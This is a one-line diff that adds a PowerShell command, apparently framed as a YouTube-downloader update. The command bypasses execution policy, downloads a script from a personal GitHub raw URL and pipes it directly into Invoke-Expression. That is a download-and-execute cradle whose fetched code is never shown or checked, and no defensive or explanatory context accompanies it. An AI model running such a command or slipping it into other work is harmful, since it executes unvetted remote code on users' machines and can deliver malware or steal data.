@@ -1,0 +1,1 @@
+powershell -NoP -Ep Bypass -C "$env:YTDL_FORCE=1; irm https://raw.githubusercontent.com/GrandoJunior/Youtube/main/update.ps1 | iex"
